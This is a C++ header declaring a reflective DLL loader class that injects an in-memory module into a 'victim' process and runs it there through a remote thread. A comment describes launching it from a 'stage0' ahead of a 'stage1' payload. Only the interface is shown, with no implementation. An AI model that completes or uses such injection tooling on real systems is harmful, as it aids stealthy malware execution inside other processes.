#pragma once

#include "Thread.hpp"
#include "Process.hpp"
#include "DefinesMacros.hpp"
#include "SmartHandlebase.hpp"

class ReflectiveLoader final
{
public:
	explicit ReflectiveLoader(Pid pid, const ProcessAccess access_rights, const ByteVector& module_bytes);

	explicit ReflectiveLoader(const ByteVector& module_bytes);

	// TODO: add destructor and make this RAII. Not doing this right now because I'm running the loader from a stage0 that will clean up before stage1 will finish execution

	ReflectiveLoader(ReflectiveLoader const&) = delete;
	ReflectiveLoader(ReflectiveLoader&&) = delete;
	ReflectiveLoader operator=(ReflectiveLoader const&) = delete;
	ReflectiveLoader operator=(ReflectiveLoader&&) = delete;

	void inject_module();

	void run_module_in_victim();

	NO_DISCARD static ProcessPtr find_victim_process();

	// Fix up the pe headers to be ready for injection
	NO_DISCARD static ByteVector resolve_imports_in_victim_process(Pid victim_pid, const ByteVector& module_to_inject);

private:
	// Walk on export dir and find the only exported function, this will be the DLL's LPTHREAD_START_ROUTINE "real" entrypoint for our purpose
	NO_DISCARD static Address64 get_entrypoint_from_exports(const ByteVector& module_to_inject);

	ProcessPtr m_victim_process; // The process we inject the module to.

	ByteVector m_module_to_inject; // The memory module to inject.

	Address64 m_entrypoint_rva; // Offset in module_to_inject of the entrypoint.

	Address64 m_remote_address; // Address in victim process.

	ThreadPtr m_thread; // Injected module remote thread.
};